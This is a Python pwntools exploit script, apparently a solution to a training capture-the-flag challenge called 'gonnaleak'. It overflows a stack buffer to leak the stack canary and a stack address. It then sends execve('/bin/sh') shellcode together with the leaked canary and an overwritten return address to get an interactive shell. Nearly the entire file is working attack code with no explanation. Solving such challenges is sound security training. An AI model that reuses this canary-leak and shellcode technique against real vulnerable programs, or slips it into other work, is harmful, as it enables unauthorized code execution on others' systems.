from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2011
PROG = "./gonnaleak"
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    b * 0x401255
    b*0x004011d4
    b*0x004011f7
    b* 0x00401224
    """)
    input("wait for gdb")
else:
    r = process(PROG)

r.recvuntil("Leakers gonna leak!\n")
r.recvuntil("\n")


# shellcode = b"\x90"*10 + b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05\x90\x90\x90\x90"

# payload = payload.ljust(1000,b"\x90")
# payload = cyclic(1000)

payload = b"A"*105
input("send leaking string")
r.send(payload)

# print(r.recv(130))
canary = r.recv(150)[107:114] #empirically found lol
print("The canary is ", canary, "\b The len is....", len(canary))



# input("wait")
# input("send...")
# payload = b"C"*30
# # r.send(b"A"*8)
# r.send(payload)
# print(r.recv(130)[111:])
# canary = r.recv(140)[114:]

# print(canary, len(canary))

input("sending new leak")
r.send(b"A"*104 + b"\x90"+ canary + b"Z"*24)
leak_address = r.recv(150)[-6:]
leak_address += b"\x00\x00"

guess_stack = u64(leak_address)-0x150
print("leak", leak_address)
print("computed position of the shellcode", hex(guess_stack))
# print("leak -0x70", leak_address)

shellcode = b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05"

payload = shellcode.ljust(104,b"\x90")
payload += b"\x00"
payload += canary
payload += b"Z"*8
payload += p64(guess_stack)

input("Sending shellcode + canary")
r.send(payload)


input("Sending ENTER")
r.send("\n")
r.interactive()
